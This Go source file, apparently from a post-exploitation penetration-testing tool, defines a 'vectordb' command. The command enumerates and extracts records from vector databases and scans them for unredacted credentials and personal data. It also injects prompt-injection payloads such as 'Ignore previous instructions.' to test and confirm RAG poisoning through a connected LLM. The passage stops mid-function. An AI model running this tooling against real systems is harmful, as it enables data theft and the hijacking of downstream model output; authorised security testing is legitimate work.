package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/professor-moody/aipostex/internal/credchain"
	exploitcommon "github.com/professor-moody/aipostex/pkg/exploit/common"
	"github.com/professor-moody/aipostex/pkg/exploit/vectordb"
	"github.com/professor-moody/aipostex/pkg/report"
)

var (
	vdbTarget     string
	vdbType       string
	vdbCollection string
	vdbLimit      int
	vdbMaxDocs    int
	vdbHeaders    []string
	vdbAPIKey     string

	// pgvector-specific flags
	vdbDBUser string
	vdbDBPass string
	vdbDBName string
	vdbDBSSL  string

	// inject flags
	vdbInjectPayload  string
	vdbInjectMetadata string
	vdbInjectCount    int

	// metadata-inject flags
	vdbMetaKey     string
	vdbMetaPayload string

	// search-sensitive flags
	vdbExcludeCollections []string

	// persist-inject verification flags
	vdbVerifyPersist bool
	vdbVerifyDelay   time.Duration

	// rag-verify flags
	vdbRAGLLMTarget string
	vdbRAGLLMModel  string
	vdbRAGCanary    string
	vdbRAGQuery     string
	vdbRAGHeaders   []string
	vdbRAGDelay     time.Duration
)

var vectordbCmd = &cobra.Command{
	Use:   "vectordb",
	Short: "Enumerate and extract data from vector databases",
	Long: `Post-exploitation module for vector databases.

Supported providers: chromadb, weaviate, qdrant, milvus, pgvector

Examples:
  aipostex vectordb --target http://10.0.0.60:8000 --type chromadb enum
  aipostex vectordb --target http://10.0.0.60:8080 --type weaviate extract --collection Documents
  aipostex vectordb --target http://10.0.0.60:6333 --type qdrant search-sensitive
  aipostex vectordb --target http://10.0.0.60:19530 --type milvus enum
  aipostex vectordb --target http://10.0.0.60:19530 --type milvus inject --collection docs --payload "Test" --force-exploit`,
	Example: strings.Join([]string{
		formatCommandExample("vectordb --target http://127.0.0.1:8000 --type chromadb enum"),
		formatCommandExample("vectordb --target http://127.0.0.1:8080 --type weaviate extract --collection Documents"),
		formatCommandExample("vectordb --target http://127.0.0.1:19530 --type milvus enum"),
	}, "\n"),
}

var vdbEnumCmd = &cobra.Command{
	Use:   "enum",
	Short: "Enumerate collections and object counts",
	Long: `List the collections a vector database exposes, with per-collection object
counts. Counts matter offensively: they tell you which collection holds the
corpus worth extracting, before you pull any records.

This is a read-only probing operation.`,
	Example: formatCommandExample("vectordb --target http://127.0.0.1:8080 --type weaviate enum"),
	RunE:    runVDBEnum,
}

var vdbExtractCmd = &cobra.Command{
	Use:   "extract",
	Short: "Extract records from a collection",
	Long: `Pull records out of a collection. A vector database backing a RAG pipeline
holds the ingested source documents — the private corpus the application was
built to answer from — so extraction reads the data itself, not just metadata.

Use --collection to target one collection and --limit to bound the pull. This is
a read-only operation; nothing is written to the target.`,
	Example: formatCommandExample("vectordb --target http://127.0.0.1:8080 --type weaviate extract --collection Documents --limit 25"),
	RunE:    runVDBExtract,
}

var vdbSearchCmd = &cobra.Command{
	Use:   "search-sensitive",
	Short: "Search extracted records for sensitive data patterns",
	Long: `Extract records and match them against sensitive-data patterns (credentials,
keys, tokens, personal data), so a large corpus is triaged to the parts worth an
operator's attention. Matches are surfaced as findings with the raw value intact,
so anything credential-shaped reaches the credential index.

This is a read-only operation.`,
	Example: formatCommandExample("vectordb --target http://127.0.0.1:8080 --type weaviate search-sensitive --collection Documents"),
	RunE:    runVDBSearch,
}

var vdbInjectCmd = &cobra.Command{
	Use:   "inject",
	Short: "Inject crafted documents into a vector store (RAG poisoning test)",
	Long: `Insert crafted documents/entities into a vector store to test RAG poisoning susceptibility.

This is an active exploit action and requires --force-exploit.`,
	Example: formatCommandExample("vectordb --target http://127.0.0.1:8000 --type chromadb inject --collection docs --payload \"Ignore previous instructions.\" --force-exploit"),
	RunE:    runVDBInject,
}

var vdbMetaInjectCmd = &cobra.Command{
	Use:   "metadata-inject",
	Short: "Test metadata field injection in vector stores",
	Long: `Insert a document with a prompt injection payload in a metadata field, then
verify the payload is returned unsanitized. Tests whether metadata fields can
carry prompt injection payloads through RAG pipelines.

This is an active exploit action and requires --force-exploit.`,
	Example: formatCommandExample("vectordb --target http://127.0.0.1:8000 --type chromadb metadata-inject --collection docs --force-exploit"),
	RunE:    runVDBMetaInject,
}

var vdbRAGVerifyCmd = &cobra.Command{
	Use:   "rag-verify",
	Short: "End-to-end RAG poisoning proof: inject into vectordb, verify via LLM",
	Long: `Inject a canary document into a vector store, then query a connected LLM
endpoint to verify the injected content surfaces in the model's response.
This proves full RAG poisoning — that an attacker who can write to the vector
store can influence downstream LLM output.

Requires --force-exploit and an OpenAI-compatible LLM endpoint (--llm-target).`,
	Example: formatCommandExample("vectordb --target http://chromadb:8000 --type chromadb rag-verify --collection docs --llm-target http://litellm:4000 --force-exploit"),
	RunE:    runVDBRAGVerify,
}

func init() {
	vectordbCmd.PersistentFlags().StringVarP(&vdbTarget, "target", "t", "", "Vector DB URL (required)")
	vectordbCmd.PersistentFlags().StringVar(&vdbType, "type", "chromadb", "Database type: chromadb, weaviate, qdrant, milvus, pgvector")
	vectordbCmd.PersistentFlags().StringSliceVar(&vdbHeaders, "header", nil, "Additional HTTP header(s) in 'Key: Value' format")
	vectordbCmd.PersistentFlags().StringVar(&vdbAPIKey, "api-key", "", "Provider API key convenience flag")

	vdbExtractCmd.Flags().StringVarP(&vdbCollection, "collection", "c", "", "Collection or class name")
	vdbExtractCmd.Flags().IntVar(&vdbLimit, "limit", 100, "Maximum records to extract")
	vdbExtractCmd.Flags().IntVar(&vdbMaxDocs, "max-docs", 0, "Compatibility alias for --limit")
	_ = vdbExtractCmd.Flags().MarkHidden("max-docs")

	vdbSearchCmd.Flags().StringVarP(&vdbCollection, "collection", "c", "", "Collection or class name (empty = all)")
	vdbSearchCmd.Flags().IntVar(&vdbLimit, "limit", 200, "Maximum records to inspect per collection")
	vdbSearchCmd.Flags().IntVar(&vdbMaxDocs, "max-docs", 0, "Compatibility alias for --limit")
	_ = vdbSearchCmd.Flags().MarkHidden("max-docs")

	vdbSearchCmd.Flags().StringSliceVar(&vdbExcludeCollections, "exclude-collections", nil, "Collection names to skip during search (e.g. public-docs,faq)")

	// pgvector-specific flags
	vectordbCmd.PersistentFlags().StringVar(&vdbDBUser, "db-user", "postgres", "PostgreSQL user (pgvector only)")
	vectordbCmd.PersistentFlags().StringVar(&vdbDBPass, "db-password", "", "PostgreSQL password (pgvector only)")
	vectordbCmd.PersistentFlags().StringVar(&vdbDBName, "db-name", "postgres", "PostgreSQL database name (pgvector only)")
	vectordbCmd.PersistentFlags().StringVar(&vdbDBSSL, "db-sslmode", "disable", "PostgreSQL SSL mode (pgvector only)")

	// inject subcommand flags
	vdbInjectCmd.Flags().StringVarP(&vdbCollection, "collection", "c", "", "Target collection (required)")
	vdbInjectCmd.Flags().StringVar(&vdbInjectPayload, "payload", "", "Text content to inject (required)")
	vdbInjectCmd.Flags().StringVar(&vdbInjectMetadata, "metadata", "", "JSON metadata key-value pairs to attach")
	vdbInjectCmd.Flags().IntVar(&vdbInjectCount, "count", 1, "Number of copies to inject")
	vdbInjectCmd.Flags().BoolVar(&vdbVerifyPersist, "verify-persist", false, "After injection, re-read injected documents to confirm persistence")
	vdbInjectCmd.Flags().DurationVar(&vdbVerifyDelay, "verify-delay", 5*time.Second, "Delay before verification to allow indexing")

	// metadata-inject subcommand flags
	vdbMetaInjectCmd.Flags().StringVarP(&vdbCollection, "collection", "c", "", "Target collection (required)")
	vdbMetaInjectCmd.Flags().StringVar(&vdbMetaKey, "key", "source", "Metadata key to inject into")
	vdbMetaInjectCmd.Flags().StringVar(&vdbMetaPayload, "payload", "", "Payload to inject (default: standard prompt injection test)")

	// rag-verify subcommand flags
	vdbRAGVerifyCmd.Flags().StringVarP(&vdbCollection, "collection", "c", "", "Target collection to inject canary into (required)")
	vdbRAGVerifyCmd.Flags().StringVar(&vdbRAGLLMTarget, "llm-target", "", "OpenAI-compatible LLM endpoint URL (required)")
	vdbRAGVerifyCmd.Flags().StringVar(&vdbRAGLLMModel, "llm-model", "", "LLM model to query (default: auto-detect)")
	vdbRAGVerifyCmd.Flags().StringVar(&vdbRAGCanary, "canary", "", "Custom canary string (default: auto-generated)")
	vdbRAGVerifyCmd.Flags().StringVar(&vdbRAGQuery, "query", "", "Custom query to send to the LLM (default: canary retrieval prompt)")
	vdbRAGVerifyCmd.Flags().StringSliceVar(&vdbRAGHeaders, "llm-header", nil, "HTTP header(s) for LLM endpoint in 'Key: Value' format")
	vdbRAGVerifyCmd.Flags().DurationVar(&vdbRAGDelay, "verify-delay", 5*time.Second, "Delay after injection before querying LLM (indexing time)")

	vectordbCmd.AddCommand(vdbEnumCmd)
	vectordbCmd.AddCommand(vdbExtractCmd)
	vectordbCmd.AddCommand(vdbSearchCmd)
	vectordbCmd.AddCommand(vdbInjectCmd)
	vectordbCmd.AddCommand(vdbMetaInjectCmd)
	vectordbCmd.AddCommand(vdbRAGVerifyCmd)
}

func runVDBEnum(cmd *cobra.Command, args []string) error {
	client, headers, err := newVDBClient()
	if err != nil {
		return err
	}

	version, err := client.ServiceVersion()
	if err != nil {
		return fmt.Errorf("connecting to %s at %s: %w", client.ProviderName(), vdbTarget, err)
	}
	collections, err := client.ListCollectionsInfo()
	if err != nil {
		return fmt.Errorf("listing collections: %w", err)
	}

	findings := []report.Finding{
		newExploitFinding(
			report.SourceVectorDB,
			vdbTarget,
			fmt.Sprintf("%s service enumerated", englishTitleCaser.String(client.ProviderName())),
			report.SeverityInfo,
			fmt.Sprintf("Enumerated %d collection(s) from %s (version: %s)", len(collections), client.ProviderName(), version),
			map[string]interface{}{
				"module":           "vectordb",
				"action":           "enum",
				"mutating":         false,
				"provider":         client.ProviderName(),
				"version":          version,
				"headers":          headerNames(headers),
				"collection_count": len(collections),
			},
		),
	}
	collectionNames := make([]string, 0, len(collections))
	for _, collection := range collections {
		collectionNames = append(collectionNames, collection.Name)
	}
	summaryPlan := buildVectorDBEnumWorkflowPlan(vdbTarget, client.ProviderName(), collectionNames)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, summaryPlan)

	for _, collection := range collections {
		metadata := map[string]interface{}{
			"module":     "vectordb",
			"action":     "enum",
			"mutating":   false,
			"provider":   client.ProviderName(),
			"collection": collection.Name,
			"class":      collection.Name,
			"count":      collection.Count,
		}
		if collection.ID != "" {
			metadata["collection_id"] = collection.ID
		}
		description := fmt.Sprintf("Collection %s is accessible with %s record count", collection.Name, renderCount(collection.Count))
		if collection.AccessDenied {
			// Distinguish an access-controlled collection from an empty one so
			// the operator does not read "0 records" as "nothing to see".
			metadata["access_denied"] = true
			description = fmt.Sprintf("Collection %s is listed but its record count is access-denied (auth required; retry with --api-key)", collection.Name)
		}
		finding := newExploitFinding(
			report.SourceVectorDB,
			vdbTarget,
			fmt.Sprintf("%s collection discovered: %s", englishTitleCaser.String(client.ProviderName()), collection.Name),
			report.SeverityInfo,
			description,
			metadata,
		)
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildVectorDBCollectionWorkflowPlan(vdbTarget, client.ProviderName(), collection.Name))
		findings = append(findings, finding)
	}

	infof("Enumerated %d %s collection(s)", len(collections), client.ProviderName())
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "vectordb",
		Action:              "enum",
		ResourcesEnumerated: len(collections),
		PartialFailures:     0,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{summaryPlan},
	})
}

func runVDBExtract(cmd *cobra.Command, args []string) error {
	if err := resolveVDBLimit(cmd); err != nil {
		return err
	}
	if strings.TrimSpace(vdbCollection) == "" {
		return missingFlagError("collection", formatCommandExample("vectordb --target http://127.0.0.1:8000 --type chromadb extract --collection docs"))
	}
	client, _, err := newVDBClient()
	if err != nil {
		return err
	}

	records, err := client.ExtractDocuments(vdbCollection, vdbLimit)
	if err != nil && len(records) == 0 {
		return fmt.Errorf("extracting %s from %s: %w", vdbCollection, client.ProviderName(), err)
	}
	extractPartialFailures := 0
	if err != nil {
		extractPartialFailures = 1
		warnf("partial extraction from %s: %v", vdbCollection, err)
	}

	findings := make([]report.Finding, 0, len(records)+1)
	summary := newExploitFinding(
		report.SourceVectorDB,
		vdbTarget,
		fmt.Sprintf("%s collection extracted: %s", englishTitleCaser.String(client.ProviderName()), vdbCollection),
		report.SeverityHigh,
		fmt.Sprintf("Extracted %d record(s) from %s", len(records), vdbCollection),
		map[string]interface{}{
			"module":     "vectordb",
			"action":     "extract",
			"mutating":   false,
			"provider":   client.ProviderName(),
			"collection": vdbCollection,
		},
	)
	var recordIDs []string
	for _, r := range records {
		recordIDs = append(recordIDs, r.ID)
	}
	summary.Evidence = fmt.Sprintf("collection=%s\nrecord_count=%d\nrecord_ids=%s",
		vdbCollection, len(records), strings.Join(recordIDs, ","))
	summary.Metadata = applyStageLanded(summary.Metadata, "impact", "read-confirmed", "vectordb-extract", "collection-records")
	extractPlan := buildVDBExtractWorkflowPlan(vdbTarget, client.ProviderName(), vdbCollection)
	summary.Metadata = attachWorkflowToMetadata(summary.Metadata, extractPlan)
	findings = append(findings, summary)

	for _, record := range records {
		finding := newExploitFinding(
			report.SourceVectorDB,
			vdbTarget,
			fmt.Sprintf("Extracted %s record from %s", englishTitleCaser.String(client.ProviderName()), vdbCollection),
			report.SeverityHigh,
			fmt.Sprintf("Record %s was readable from %s", record.ID, vdbCollection),
			map[string]interface{}{
				"module":     "vectordb",
				"action":     "extract",
				"mutating":   false,
				"provider":   client.ProviderName(),
				"collection": vdbCollection,
				"record_id":  record.ID,
			},
		)
		finding.Evidence = record.Content
		findings = append(findings, finding)
	}

	infof("Extracted %d %s record(s) from %s", len(records), client.ProviderName(), vdbCollection)
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "vectordb",
		Action:              "extract",
		ResourcesEnumerated: len(records),
		PartialFailures:     extractPartialFailures,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{extractPlan},
	})
}

func runVDBSearch(cmd *cobra.Command, args []string) error {
	if err := resolveVDBLimit(cmd); err != nil {
		return err
	}
	client, _, err := newVDBClient()
	if err != nil {
		return err
	}

	collections, err := client.ListCollectionsInfo()
	if err != nil {
		return fmt.Errorf("listing collections: %w", err)
	}
	if vdbCollection != "" {
		filtered := make([]vectordb.CollectionInfo, 0, len(collections))
		for _, collection := range collections {
			if collection.Name == vdbCollection || collection.ID == vdbCollection {
				filtered = append(filtered, collection)
			}
		}
		if len(filtered) == 0 {
			available := make([]string, 0, len(collections))
			for _, c := range collections {
				available = append(available, c.Name)
			}
			return fmt.Errorf("--collection %q matched none of the %d discovered collection(s): %v", vdbCollection, len(collections), available)
		}
		collections = filtered
	}

	excludeSet := make(map[string]bool, len(vdbExcludeCollections))
	for _, name := range vdbExcludeCollections {
		excludeSet[strings.TrimSpace(strings.ToLower(name))] = true
	}

	findings := make([]report.Finding, 0)
	partialFailures := 0
	// searchPlan is built once, from the first collection that yields a sensitive
	// match, and attached to that primary finding. The RAG-poisoning follow-on
	// targets the exact collection that held sensitive content.
	var searchPlans []workflowPlan
	for _, collection := range collections {
		if excludeSet[strings.ToLower(collection.Name)] {
			continue
		}
		records, err := client.ExtractDocuments(collection.Name, vdbLimit)
		if err != nil {
			partialFailures++
			warnf("extracting %s: %v", collection.Name, err)
			// Surface access-denied as a finding rather than a silent skip, so
			// an auth-gated collection is not reported as clean/empty.
			switch exploitcommon.ClassifyOutcome(0, err) {
			case exploitcommon.OutcomeAuthRequired:
				findings = append(findings, newExploitFinding(
					report.SourceVectorDB,
					vdbTarget,
					fmt.Sprintf("%s collection access denied: %s", englishTitleCaser.String(client.ProviderName()), collection.Name),
					report.SeverityInfo,
					fmt.Sprintf("Could not scan %s for sensitive data: access denied (auth required). This collection may hold data but was NOT scanned; retry with --api-key.", collection.Name),
					map[string]interface{}{
						"module":        "vectordb",
						"action":        "search-sensitive",
						"mutating":      false,
						"provider":      client.ProviderName(),
						"collection":    collection.Name,
						"access_denied": true,
						"scanned":       false,
					},
				))
			}
		}
		if len(records) == 0 {
			continue
		}
		matches := vectordb.SearchSensitiveDocuments(records, collection.Name)
		publicCollection := isLikelyPublicCollection(collection.Name)
		for _, match := range matches {
			if publicCollection && isLowConfidencePattern(match.Pattern) {
				continue
			}
			findings = append(findings, newExploitFinding(
				report.SourceVectorDB,
				vdbTarget,
				fmt.Sprintf("Sensitive %s data in %s", strings.ToLower(match.Pattern), collection.Name),
				match.Severity,
				fmt.Sprintf("Matched %s in %s (%s)", match.Pattern, collection.Name, match.DocumentID),
				map[string]interface{}{
					"module":     "vectordb",
					"action":     "search-sensitive",
					"mutating":   false,
					"provider":   client.ProviderName(),
					"collection": collection.Name,
					"record_id":  match.DocumentID,
					"pattern":    match.Pattern,
				},
			))
			findings[len(findings)-1].Evidence = match.Context
			// Reading sensitive data out of a collection is a confirmed impact (we read
			// it), not mere reachability.
			findings[len(findings)-1].Metadata = applyStageLanded(findings[len(findings)-1].Metadata, "impact", "read-confirmed", "vectordb-search-sensitive", "sensitive-data")
			// Attach the RAG-poisoning follow-on to the first sensitive finding, aimed
			// at the exact collection that held sensitive content. Built once.
			if searchPlans == nil {
				plan := buildVDBSearchWorkflowPlan(vdbTarget, client.ProviderName(), collection.Name)
				findings[len(findings)-1].Metadata = attachWorkflowToMetadata(findings[len(findings)-1].Metadata, plan)
				searchPlans = []workflowPlan{plan}
			}
			// Emit credential-shaped matches (API keys, tokens, DSNs) as STRUCTURED
			// extracted_credentials so the loot index / dossier / credential-chaining pick
			// them up — the same channel + helper the ray/mlflow/k8s modules use. Pure PII
			// (emails, SSNs, salaries, classification markers) has no credential type and
			// stays a finding only. Values are NEVER redacted.
			if credType, credValue := classifyVDBCredentialMatch(match.Pattern, match.Context); credType != "" {
				findings[len(findings)-1].Metadata["extracted_credentials"] = lootCredentialRecord(
					credType,
					fmt.Sprintf("%s/%s (%s)", collection.Name, match.DocumentID, match.Pattern),
					credValue,
					vdbTarget,
					fmt.Sprintf("%s found in %s collection %s document %s", match.Pattern, client.ProviderName(), collection.Name, match.DocumentID),
				)
			}
		}
	}

	infof("Sensitive search completed across %d %s collection(s)", len(collections), client.ProviderName())
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "vectordb",
		Action:              "search-sensitive",
		ResourcesEnumerated: len(collections),
		PartialFailures:     partialFailures,
		Mutating:            false,
		WorkflowPlans:       searchPlans,
	})
}

func runVDBInject(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("vectordb inject"); err != nil {
		return err
	}
	if strings.TrimSpace(vdbCollection) == "" {
		return missingFlagError("collection", formatCommandExample("vectordb --target http://127.0.0.1:8000 --type chromadb inject --collection docs --payload \"test\" --force-exploit"))
	}
	if strings.TrimSpace(vdbInjectPayload) == "" {
		return missingFlagError("payload", formatCommandExample("vectordb --target http://127.0.0.1:8000 --type chromadb inject --collection docs --payload \"Ignore previous instructions.\" --force-exploit"))
	}
	client, _, err := newVDBClient()
	if err != nil {
		return err
	}

	injectable, ok := vectordb.AsInjectable(client)
	if !ok {
		return fmt.Errorf("provider %s does not support injection", client.ProviderName())
	}

	var metadata map[string]interface{}
	if strings.TrimSpace(vdbInjectMetadata) != "" {
		if err := json.Unmarshal([]byte(vdbInjectMetadata), &metadata); err != nil {
			return fmt.Errorf("parsing --metadata JSON: %w", err)
		}
	}

	ids, err := injectable.InjectDocument(vdbCollection, vdbInjectPayload, metadata, vdbInjectCount)
	if err != nil {
		return fmt.Errorf("injecting into %s: %w", vdbCollection, err)
	}

	// A successful write (returned IDs) proves the add/upsert was accepted, NOT
	// that the document persisted and is retrievable — some stores accept and
	// then silently drop or async-index. Cap this initial finding at
	// submission-accepted; the --verify-persist path below re-reads the docs and
	// emits a separate persistence-confirmed finding when it actually confirms.
	finding := newExploitFinding(
		report.SourceVectorDB,
		vdbTarget,
		fmt.Sprintf("%s RAG poisoning injection accepted: %s", englishTitleCaser.String(client.ProviderName()), vdbCollection),
		report.SeverityHigh,
		fmt.Sprintf("Injection of %d document(s) into %s collection %s was accepted (persistence not verified — re-run with --verify-persist to confirm retrieval)", len(ids), client.ProviderName(), vdbCollection),
		map[string]interface{}{
			"module":     "vectordb",
			"action":     "inject",
			"mutating":   true,
			"provider":   client.ProviderName(),
			"collection": vdbCollection,
			"count":      len(ids),
			"stage":      "submission",
			"landed":     "submission-accepted",
		},
	)
	finding.Evidence = fmt.Sprintf("Injected IDs: %s\nPayload: %s", strings.Join(ids, ", "), vdbInjectPayload)
	injectPlan := buildVDBInjectWorkflowPlan(vdbTarget, client.ProviderName(), vdbCollection)
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, injectPlan)

	findings := []report.Finding{finding}

	// D5: verify-persist — re-read injected docs after delay
	if vdbVerifyPersist && len(ids) > 0 {
		infof("Waiting %s for indexing before verification...", vdbVerifyDelay)
		time.Sleep(vdbVerifyDelay)

		docs, extractErr := client.ExtractDocuments(vdbCollection, len(ids)*2)
		if extractErr != nil {
			warnf("verify-persist extraction failed: %v", extractErr)
		} else {
			idSet := make(map[string]bool, len(ids))
			for _, id := range ids {
				idSet[id] = true
			}
			var confirmed int
			for _, doc := range docs {
				if idSet[doc.ID] {
					confirmed++
				}
			}
			// Grade honestly against what actually re-read back:
			//   0 confirmed   → nothing persisted; the write was only accepted → influenced/access
			//   1..N-1        → some persisted (partial round-trip) → read-confirmed/impact
			//   all N         → full poison persistence (re-served) → takeover-capable/own
			var landed, stage, title string
			var severity string
			switch {
			case confirmed == 0:
				landed, stage, severity = "influenced", "access", report.SeverityMedium
				title = fmt.Sprintf("%s RAG injection accepted, persistence NOT confirmed: %s", englishTitleCaser.String(client.ProviderName()), vdbCollection)
			case confirmed < len(ids):
				landed, stage, severity = "partial-persistence", "impact", report.SeverityHigh
				title = fmt.Sprintf("%s RAG partial persistence confirmed: %s", englishTitleCaser.String(client.ProviderName()), vdbCollection)
			default:
				landed, stage, severity = "persistence-confirmed", "own", report.SeverityCritical
				title = fmt.Sprintf("%s RAG persistence verified: %s", englishTitleCaser.String(client.ProviderName()), vdbCollection)
			}
			verifyFinding := newExploitFinding(
				report.SourceVectorDB,
				vdbTarget,
				title,
				severity,
				fmt.Sprintf("Re-read %d/%d injected document(s) in %s after %s delay",
					confirmed, len(ids), vdbCollection, vdbVerifyDelay),
				map[string]interface{}{
					"module":       "vectordb",
					"action":       "inject",
					"mutating":     false,
					"provider":     client.ProviderName(),
					"collection":   vdbCollection,
					"injected":     len(ids),
					"confirmed":    confirmed,
					"missing":      len(ids) - confirmed,
					"verify_delay": vdbVerifyDelay.String(),
				},
			)
			verifyFinding.Evidence = fmt.Sprintf("Injected: %d\nConfirmed: %d\nMissing: %d\nIDs: %s",
				len(ids), confirmed, len(ids)-confirmed, strings.Join(ids, ", "))
			verifyFinding.Metadata = applyStageLanded(verifyFinding.Metadata, stage, landed, "vectordb-inject", "verify-persist")
			findings = append(findings, verifyFinding)
			infof("Persistence verification: %d/%d confirmed", confirmed, len(ids))
		}
	}

	infof("Injected %d document(s) into %s %s", len(ids), client.ProviderName(), vdbCollection)
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "vectordb",
		Action:              "inject",
		ResourcesEnumerated: len(ids),
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{injectPlan},
	})
}

func runVDBMetaInject(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("vectordb metadata-inject"); err != nil {
		return err
	}
	if strings.TrimSpace(vdbCollection) == "" {
		return missingFlagError("collection", formatCommandExample("vectordb --target http://127.0.0.1:8000 --type chromadb metadata-inject --collection docs --force-exploit"))
	}
	payload := vdbMetaPayload
	if strings.TrimSpace(payload) == "" {
		payload = vectordb.DefaultPromptInjectionPayload
	}

	client, _, err := newVDBClient()
	if err != nil {
		return err
	}

	injectable, ok := vectordb.AsMetadataInjectable(client)
	if !ok {
		return fmt.Errorf("provider %s does not support metadata injection", client.ProviderName())
	}

	injected, returnedVal, err := injectable.InjectAndVerifyMetadata(vdbCollection, vdbMetaKey, payload)
	if err != nil {
		return fmt.Errorf("metadata injection test: %w", err)
	}

	severity := report.SeverityMedium
	title := fmt.Sprintf("%s metadata injection test: %s", englishTitleCaser.String(client.ProviderName()), vdbCollection)
	description := fmt.Sprintf("Metadata injection into key %q was not returned unsanitized", vdbMetaKey)
	if injected {
		severity = report.SeverityHigh
		description = fmt.Sprintf("Metadata field %q in %s collection %s accepts and returns unsanitized payloads — prompt injection via metadata is viable", vdbMetaKey, client.ProviderName(), vdbCollection)
	}

	finding := newExploitFinding(
		report.SourceVectorDB,
		vdbTarget,
		title,
		severity,
		description,
		map[string]interface{}{
			"module":           "vectordb",
			"action":           "metadata-inject",
			"mutating":         true,
			"provider":         client.ProviderName(),
			"collection":       vdbCollection,
			"metadata_key":     vdbMetaKey,
			"injection_viable": injected,
			// The injected metadata being returned unsanitized confirms the write
			// round-trips (read-confirmed) — a metadata mutation, not code execution.
			"stage":  gatedStrength(injected, "exploited", "submission"),
			"landed": gatedStrength(injected, "read-confirmed", "submission-accepted"),
		},
	)
	if injected {
		finding.Evidence = fmt.Sprintf("Key: %s\nInjected: %s\nReturned: %s", vdbMetaKey, payload, returnedVal)
	}

	infof("Metadata injection test completed (viable=%t)", injected)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "vectordb",
		Action:              "metadata-inject",
		ResourcesEnumerated: 1,
		Mutating:            true,
	})
}

func runVDBRAGVerify(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("vectordb rag-verify"); err != nil {
		return err
	}
	if strings.TrimSpace(vdbCollection) == "" {
		return missingFlagError("collection", formatCommandExample("vectordb --target http://chromadb:8000 --type chromadb rag-verify --collection docs --llm-target http://litellm:4000 --force-exploit"))
	}
	if strings.TrimSpace(vdbRAGLLMTarget) == "" {
		return missingFlagError("llm-target", formatCommandExample("vectordb --target http://chromadb:8000 --type chromadb rag-verify --collection docs --llm-target http://litellm:4000 --force-exploit"))
	}

	client, _, err := newVDBClient()
	if err != nil {
		return err
	}

	llmHeaders, err := exploitcommon.ParseHeaderFlags(vdbRAGHeaders)
	if err != nil {
		return fmt.Errorf("parsing LLM headers: %w", err)
	}

	canary := vdbRAGCanary
	if strings.TrimSpace(canary) == "" {
		canary = vectordb.GenerateCanary()
	}

	infof("Starting RAG round-trip verification against %s collection %q", client.ProviderName(), vdbCollection)
	infof("Canary: %s", canary)
	infof("LLM target: %s", vdbRAGLLMTarget)

	// Configured (proxy/TLS/stealth-aware) client for the LLM query — the RAG verify must
	// use the same transport as the rest of the scan, not a bare client.
	llmHTTPClient, err := cfg.NewHTTPClient()
	if err != nil {
		return fmt.Errorf("creating LLM HTTP client: %w", err)
	}
	ragCfg := vectordb.RAGVerifyConfig{
		LLMBaseURL:  vdbRAGLLMTarget,
		LLMModel:    vdbRAGLLMModel,
		LLMHeaders:  llmHeaders,
		LLMTimeout:  cfg.Timeout,
		Collection:  vdbCollection,
		Canary:      canary,
		Query:       vdbRAGQuery,
		VerifyDelay: vdbRAGDelay,
		HTTPClient:  llmHTTPClient,
		Context:     cmd.Context(),
	}

	result, err := vectordb.VerifyRAGRoundTrip(client, ragCfg)
	if err != nil && result == nil {
		return fmt.Errorf("RAG round-trip verification: %w", err)
	}

	var findings []report.Finding

	// Always emit the injection finding.
	if result.Injected {
		landed := "injection-only"
		severity := report.SeverityMedium
		provider := englishTitleCaser.String(client.ProviderName())
		// Not a clean round-trip: injection succeeded but the LLM query did not complete.
		title := fmt.Sprintf("%s RAG verification partial: injection succeeded, LLM query failed (%s)", provider, vdbCollection)
		description := fmt.Sprintf("Injected canary document into %s collection %s but the LLM query failed, so round-trip retrieval could not be verified",
			client.ProviderName(), vdbCollection)

		if result.CanaryFound {
			landed = "llm-confirmed"
			severity = report.SeverityCritical
			title = fmt.Sprintf("%s RAG round-trip verification: %s", provider, vdbCollection)
			description = fmt.Sprintf("RAG poisoning confirmed: canary injected into %s collection %s was retrieved and surfaced in LLM response from %s",
				client.ProviderName(), vdbCollection, vdbRAGLLMTarget)
		} else if result.LLMQueried {
			severity = report.SeverityHigh
			title = fmt.Sprintf("%s RAG verification: canary not surfaced in LLM output (%s)", provider, vdbCollection)
			description = fmt.Sprintf("Canary injected into %s collection %s; LLM queried successfully but canary not found in response — RAG pipeline may not use this collection, or indexing delay insufficient",
				client.ProviderName(), vdbCollection)
		}

		finding := newExploitFinding(
			report.SourceVectorDB,
			vdbTarget,
			title,
			severity,
			description,
			map[string]interface{}{
				"module":       "vectordb",
				"action":       "rag-verify",
				"mutating":     true,
				"provider":     client.ProviderName(),
				"collection":   vdbCollection,
				"canary":       canary,
				"llm_target":   vdbRAGLLMTarget,
				"llm_model":    ragCfg.LLMModel,
				"injected":     result.Injected,
				"llm_queried":  result.LLMQueried,
				"canary_found": result.CanaryFound,
				"stage":        "rag-round-trip",
				"landed":       landed,
			},
		)

		var evidenceLines []string
		evidenceLines = append(evidenceLines, fmt.Sprintf("Canary: %s", canary))
		evidenceLines = append(evidenceLines, fmt.Sprintf("Collection: %s", vdbCollection))
		evidenceLines = append(evidenceLines, fmt.Sprintf("Injected IDs: %s", strings.Join(result.InjectedIDs, ", ")))
		evidenceLines = append(evidenceLines, fmt.Sprintf("LLM Target: %s", vdbRAGLLMTarget))
		if result.LLMQueried {
			evidenceLines = append(evidenceLines, fmt.Sprintf("LLM Response: %s", truncateStr(result.LLMResponse, 500)))
			evidenceLines = append(evidenceLines, fmt.Sprintf("Canary Found: %t", result.CanaryFound))
		}
		finding.Evidence = strings.Join(evidenceLines, "\n")
		finding.Metadata = applyStageLanded(finding.Metadata, "impact", landed, "vectordb-inject", "rag-verify")
		findings = append(findings, finding)
	}

	// Log summary.
	if result.CanaryFound {
		infof("RAG POISONING CONFIRMED — canary found in LLM response")
	} else if result.LLMQueried {
